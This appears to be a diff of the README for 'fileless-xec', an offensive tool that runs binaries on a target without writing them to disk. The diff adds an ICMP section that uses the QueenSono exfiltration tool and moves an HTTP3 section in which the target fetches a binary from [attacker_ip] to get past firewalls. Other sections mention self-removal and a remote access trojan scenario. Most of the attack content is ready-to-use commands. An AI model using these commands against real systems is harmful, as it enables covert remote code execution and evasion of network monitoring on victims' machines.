@@ -5,8 +5,9 @@
   - [Execute binary with stdout/stdin](#execute-binary-with-stdoutstdin)
   - [Execute binary with arguments](#execute-binary-with-arguments)
   - [`fileless-xec` self remove](#fileless-xec-self-remove)
-  - ["Remote go": execute go binaries without having go installed locally](#remote-go-execute-go-binaries-without-having-go-installed-locally)
+  - [Bypass network restriction with ICMP](#bypass-network-restriction-with-icmp)
   - [Bypass firewall with HTTP3](#bypass-firewall-with-http3)
+  - ["Remote go": execute go binaries without having go installed locally](#remote-go-execute-go-binaries-without-having-go-installed-locally)
   - [Execute a shell script](#execute-a-shell-script)
   - [`fileless-xec` server mode](#fileless-xec-server-mode)
     - [RAT (Remote Access Trojan) scenarion](#rat-remote-access-trojan-scenario)
@@ -37,6 +38,42 @@ On linux, you could remove `fileless-xec`from disk during its execution. This a 
 fileless-xec --self-remove [binary_url]
 ```
 
+## Bypass network restriction with ICMP
+
+For several reasons, it is sometimes stealther to use icmp protocol (not monitored, not blocked, etc ...). In this case, fileless-xec could be used as an ICMP server to retrieve binary content before execute it. 
+
+*Product placement: To send the binary content you should use [`QueenSono`](https://github.com/ariary/QueenSono) (icmp tools for data transfer/exfiltration)
+
+On target machine, launch the icmp server:
+```
+fileless-xec icmpserver [listening_addr]
+```
+
+On attacker machine, base64 encode the binary, and send it using `qssender` (Queensono client):
+```
+cat [binary] | base64 > tmp
+qssender send file -d 1 -l 0.0.0.0 -r [remote_listening_addr] -s 63000 tmp
+rm tmp
+```
+
+
+## Bypass firewall with HTTP3
+
+See [HTTP3 - README](https://github.com/ariary/fileless-xec#http3quic) for explanation about the benefit of HTTP3 (spoil: bypass fw):
+
+On attacker machine, set up HTTP3 server:
+```bash
+./example/http3/genkey.sh
+go build light-server.go
+./light-server  # launch on port 6121
+```
+
+On target machine, tell that you want to use http3:
+```
+fileless-xec --http3 https://[attacker_ip]:6121/[binary_name]
+```
+
+
 ## "Remote go": execute go binaries without having go installed locally
 
 ### Pre-requisites
@@ -56,21 +93,6 @@ You will build your go on attacker machine, and use `fileless-xec` to execute it
 
 Of course, this use case is applicable for every program language that provides toolchains to make binaries (ex C/C++)
 
-## Bypass firewall with HTTP3
-
-See [HTTP3 - README](https://github.com/ariary/fileless-xec#http3quic) for explanation about the benefit of HTTP3 (spoil: bypass fw):
-
-On attacker machine, set up HTTP3 server:
-```bash
-./example/http3/genkey.sh
-go build light-server.go
-./light-server  # launch on port 6121
-```
-
-On target machine, tell that you want to use http3:
-```
-fileless-xec --http3 https://[attacker_ip]:6121/[binary_name]
-```
 
 ## Execute a shell script
 
